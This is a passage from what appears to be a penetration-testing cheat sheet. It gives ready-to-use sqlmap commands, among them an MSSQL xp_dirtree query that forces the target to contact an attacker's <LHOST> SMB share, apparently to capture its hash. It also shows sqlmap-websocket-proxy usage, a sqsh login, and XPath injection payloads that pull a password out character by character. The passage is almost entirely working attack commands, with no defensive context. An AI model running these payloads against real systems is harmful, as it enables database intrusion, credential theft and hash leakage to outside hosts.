$ sqlmap -r login.req --sql-query="exec master.dbo.xp_dirtree '\\\\<LHOST>\\share'"
```

## sqlmap Websocket Proxy

> https://github.com/BKreisel/sqlmap-websocket-proxy

```c
$ sqlmap-websocket-proxy -u 'ws://ws.<RHOST>:5789/version' -p '{"version": "2\u0022 %param%"}' --json
```

```c
$ sqlmap -u 'http://localhost:8080/?param1=1'
```

## sqsh

```c
$ sqsh -S <RHOST> -U <USERNAME>
```

## xpath injection

```c
test' or 1=1 or 'a'='a
test' or 1=2 or 'a'='a
'or substring(Password,1,1)='p' or'    // checking letter "p" on the beginning of the password
'or substring(Password,2,1)='p' or'    // checking letter "p" on the second position of the password
```
